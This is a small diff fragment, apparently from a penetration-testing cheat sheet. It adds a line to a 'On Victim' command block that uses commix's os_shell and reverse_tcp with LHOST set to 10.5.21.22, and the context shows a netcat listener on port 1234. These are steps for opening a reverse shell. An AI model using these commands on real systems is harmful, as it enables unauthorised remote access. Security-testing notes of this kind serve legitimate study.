@@ -9,6 +9,7 @@ nc -lvp 1234
 On Victim
 ------------
 ```bash
+os_shell
 commix(os_shell)
 reverse_tcp
 set LHOST 10.5.21.22
